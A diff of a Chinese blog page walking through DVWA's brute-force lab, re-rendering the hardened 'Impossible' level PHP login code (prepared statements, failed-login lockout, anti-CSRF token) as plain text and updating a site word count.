+        $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );
+        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    } else {
+        // Login failed
+        sleep( rand( 2, 4 ) );
 
-        <span class="token comment" spellcheck="true">// Give the user some feedback</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;br />&lt;br/>Alternative, the account has been locked because of too many failed logins.&lt;br />If this is the case, &lt;em>please try again in {$lockout_time} minutes&lt;/em>.&lt;/pre>"</span><span class="token punctuation">;</span>
+        // Give the user some feedback
+        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;
 
-        <span class="token comment" spellcheck="true">// Update bad login count</span>
-        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
+        // Update bad login count
+        $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );
+        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    }
 
-    <span class="token comment" spellcheck="true">// Set the last login time</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+    // Set the last login time
+    $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; );
+    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+}
 
-<span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span>
-<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+// Generate Anti-CSRF token
+generateSessionToken();
 
-<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt; </code></pre>
 <p>说明：</p>
 <ul>
 <li>相比High级别的代码，Impossible级别的代码采用POST方式向服务器提交数据。</li>
@@ -1816,7 +1815,7 @@ BASE_DIR <span class="token operator">=</span> os<span class="token punctuation"
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">201k</span>&nbsp;字
+                class="white-color">207.6k</span>&nbsp;字
             
             
             
